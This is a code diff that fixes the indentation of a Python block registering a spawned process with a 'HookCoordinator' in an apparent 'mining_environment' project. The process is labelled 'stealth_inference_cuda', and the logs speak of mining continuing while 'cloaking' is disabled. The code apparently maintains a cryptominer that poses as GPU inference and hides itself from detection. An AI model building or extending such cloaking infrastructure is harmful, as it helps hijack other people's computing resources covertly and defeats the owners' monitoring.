@@ -249,36 +249,36 @@ def main():
             monitor_thread.start()
 
             # 🚀 **PRIMARY HANDOFF TO HOOKCOORDINATOR** (chuyển giao chính đến HookCoordinator)
-                # This is the single point of entry for PID registration.
-                # The fallback logic has been removed to prevent context mismatch.
-                try:
-                    from mining_environment.coordination.coordinator import get_hook_coordinator
+            # This is the single point of entry for PID registration.
+            # The fallback logic has been removed to prevent context mismatch.
+            try:
+                from mining_environment.coordination.coordinator import get_hook_coordinator
 
-                    process_metadata = {
-                        'role': 'real',
-                        'timestamp': time.time(),
-                        'wrapper_pid': os.getpid(),
-                        'stealth_enabled': False,
-                        'registration_source': 'stealth_inference_cuda'
-                    }
+                process_metadata = {
+                    'role': 'real',
+                    'timestamp': time.time(),
+                    'wrapper_pid': os.getpid(),
+                    'stealth_enabled': False,
+                    'registration_source': 'stealth_inference_cuda'
+                }
 
-                    coordinator = get_hook_coordinator()
-                    success = coordinator.receive_from_stealth_wrapper(
-                        pid=process.pid,
-                        process_metadata=process_metadata,
-                        subprocess_env=clean_env
-                    )
+                coordinator = get_hook_coordinator()
+                success = coordinator.receive_from_stealth_wrapper(
+                    pid=process.pid,
+                    process_metadata=process_metadata,
+                    subprocess_env=clean_env
+                )
 
-                    if success:
-                        logger.info(f"✅ [HANDOFF] Primary handoff to HookCoordinator successful for PID={process.pid}")
-                        logger.info(f"🔗 [HANDOFF] Coordination chain: HookCoordinator → DirectPIDRegistry → ResourceManager")
-                    else:
-                        logger.error(f"❌ [HANDOFF] Primary handoff to HookCoordinator FAILED for PID {process.pid}")
-                        logger.warning(f"⚠️ [HANDOFF] Mining will continue, but cloaking and optimization will be DISABLED.")
+                if success:
+                    logger.info(f"✅ [HANDOFF] Primary handoff to HookCoordinator successful for PID={process.pid}")
+                    logger.info(f"🔗 [HANDOFF] Coordination chain: HookCoordinator → DirectPIDRegistry → ResourceManager")
+                else:
+                    logger.error(f"❌ [HANDOFF] Primary handoff to HookCoordinator FAILED for PID {process.pid}")
+                    logger.warning(f"⚠️ [HANDOFF] Mining will continue, but cloaking and optimization will be DISABLED.")
 
-                except Exception as handoff_err:
-                    logger.critical(f"🚨 [HANDOFF-CRITICAL] Could not perform handoff to HookCoordinator: {handoff_err}")
-                    logger.warning(f"⚠️ [HANDOFF-CRITICAL] This is a critical architecture failure. Cloaking is non-functional.")
+            except Exception as handoff_err:
+                logger.critical(f"🚨 [HANDOFF-CRITICAL] Could not perform handoff to HookCoordinator: {handoff_err}")
+                logger.warning(f"⚠️ [HANDOFF-CRITICAL] This is a critical architecture failure. Cloaking is non-functional.")
             except Exception as rename_err:
                 logger.error(f"❌ [GPU-POST-EXEC] Post-exec sequencing error: {rename_err}")
 
